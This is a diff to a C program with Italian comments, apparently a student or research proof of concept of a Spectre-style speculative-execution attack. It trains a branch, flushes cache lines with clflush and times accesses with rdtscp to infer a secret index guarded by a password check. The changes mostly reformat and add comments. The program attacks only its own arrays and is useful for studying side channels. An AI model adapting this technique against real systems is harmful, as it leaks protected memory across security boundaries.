@@ -11,11 +11,8 @@
 #include <time.h>
 #include <x86intrin.h> // per usare rdtscp e clflush
 
-/********************************************************************
- Codice vittima
- ********************************************************************/
+/*************** Codice vittima ***************/
 #define SIZE 3000
-
 uint8_t unused1[64];
 unsigned int secret[SIZE];
 uint8_t unused2[64];
@@ -23,7 +20,7 @@ unsigned int array2[SIZE];
 uint8_t unused3[64];
 unsigned int passwordDigest[SIZE];
 
-uint8_t temp = 0; /* per non far ottimizzare victim_function() dal compilatore */
+uint8_t temp = 0;
 
 void victim_function(int userID, int pwd) {
 	if (pwd == passwordDigest[userID]) {
@@ -31,10 +28,7 @@ void victim_function(int userID, int pwd) {
 	}
 }
 
-/**********************************************************************
- Main
- *********************************************************************/
-
+/******************** Main ********************/
 int main(int argn, char *argv[]) {
 
 #define CACHELINE 512
@@ -52,28 +46,38 @@ int main(int argn, char *argv[]) {
 	}
 
 	// parametri
-	int numberOfRuns = strtol(argv[1], NULL, 10); // numero di round per ogni test
-	int numberOfTest = strtol(argv[2], NULL, 10); // numero di test
-	int cacheHitThreshold = strtol(argv[3], NULL, 10); // soglia per cache hit
-	int precisionLoss = strtol(argv[4], NULL, 10); // precisione dei risultati
 
-	int blocks = sizeof(array2[0]) * 8; // numero di bit occupati da ogni posizione dell'array
-	int delta = CACHELINE / blocks; // numero di elementi in una line
-	int class = SIZE / delta + 1; // classi di risultati
+	// numero di round per test
+	int numberOfRuns = strtol(argv[1], NULL, 10);
+	// numero di test
+	int numberOfTest = strtol(argv[2], NULL, 10);
+	// soglia cache hit
+	int cacheHitThreshold = strtol(argv[3], NULL, 10);
+	// precisione dei risultati
+	int precisionLoss = strtol(argv[4], NULL, 10);
+	// numero di bit occupati da ogni posizione dell'array
+	int blocks = sizeof(array2[0]) * 8;
+	// numero di elementi in una line
+	int delta = CACHELINE / blocks;
+	// classi di risultati
+	int class = SIZE / delta + 1;
 
 	// contatori
 	int ok = 0;
 	int error = 0;
 	int noHit = 0;
 
-	int results[class]; // array risultati
+	// array risultati
+	int results[class];
 
 	unsigned int timeReg;
 	register uint64_t time1, time2;
 
-	// inizializzo il seme del random per avere risultati diversi ad ogni test
+	/* inizializzo il seme del generatore
+	random per avere risultati diversi ad ogni test*/
 	srand(time(NULL));
 
+	// per ogni test
 	for (int t = 1; t <= numberOfTest; t++) {
 
 		printf("Test %d di %d\n", t, numberOfTest);
@@ -88,6 +92,7 @@ int main(int argn, char *argv[]) {
 			secret[i] = rand() % SIZE;
 		}
 
+		// scelgo password sicuramente sbagliata
 		int wrongPassword = passwordDigest[userUnderAttack] + 1;
 
 		// inizializzo a 0 l'array risultati
@@ -105,12 +110,13 @@ int main(int argn, char *argv[]) {
 					victim_function(1, passwordDigest[1]);
 				}
 
-				// flushing array1 e passwordDigest dalla cache
+				// flushing array2 e passwordDigest dalla cache
 				for (int i = 0; i < SIZE; i++) {
 					_mm_clflush(&array2[i]);
 					_mm_clflush(&passwordDigest[i]);
 				}
 
+				// aspetto che le operazioni in memoria vengano eseguite
 				_mm_lfence();
 
 				// richiamo la funzione vittima con l'ID da attaccare
@@ -125,7 +131,7 @@ int main(int argn, char *argv[]) {
 				_mm_lfence();
 
 				// aggiorno la posizione corrispondente di results
-				// se il tempo < della soglia
+				// se il tempo <= della soglia
 				if ((int) time2 <= cacheHitThreshold) {
 					results[l]++;
 				}
@@ -169,7 +175,7 @@ int main(int argn, char *argv[]) {
 		}
 	}
 
-// stampo il conteggio totale degli errori e degli ok
+	// stampo il conteggio totale degli errori e degli ok
 	printf("***TOTAL***\nOK -> %d\nNO-HIT -> %d\nERROR -> %d\n", ok, noHit,
 			error);
 
